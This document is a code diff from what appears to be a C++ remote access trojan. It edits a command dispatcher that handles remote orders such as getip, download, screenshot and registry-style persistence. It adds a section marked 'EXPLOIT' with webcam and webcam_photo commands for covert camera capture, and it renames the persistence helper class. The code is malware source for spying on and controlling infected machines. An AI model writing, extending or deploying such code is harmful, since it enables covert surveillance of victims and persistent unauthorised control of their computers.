@@ -39,7 +39,7 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	}
 	else if (args[0] == "getip" && args.size() == 1)
 	{
-		client->send_b(Auto::get_ip().c_str());
+		client->send_b(AutoStart::get_ip().c_str());
 	}
 	else if (args[0] == "mute" && args.size() == 1)
 	{
@@ -106,6 +106,14 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	else if (args[0] == "download" && args.size() == 2)
 	{
 		Transfer::downloadFromClient(client, args[1]);
+	}// ------------------------------------ EXPLOIT -----------------------------------------------
+	else if (args[0] == "webcam" && args.size() == 2)
+	{
+		Exploits::webcam(client, args[1]);
+	}
+	else if (args[0] == "webcam_photo" && args.size() == 1)
+	{
+		Exploits::webcam_photo(client);
 	}
 	else if (args[0] == "screenshot" && args.size() ==1)
 	{
@@ -115,12 +123,11 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Transfer::ask(client,args[1], DEFAULT_NAME);
 	}
-	else if (args[0] == "ask" && args.size() == 3)
+	else if (args[0] == "ask" && args.size() == 3 )
 	{
 		Transfer::ask(client, args[1], args[2]);
 	}
 	else
-		if (!client->getMute())
 		{
 			client->send_b(("Command " + buffer + " not found").c_str());
 		}
@@ -139,5 +146,5 @@ void Factory_Client::arg_self_persistence()
 	std::wstring wstr = conv.from_bytes(keyname);
 	client->send_b("Putting persistence with keyname : ");
 	client->send_b(keyname.c_str());
-	Auto::persistence(wstr.c_str());
+	AutoStart::persistence(wstr.c_str());
 }
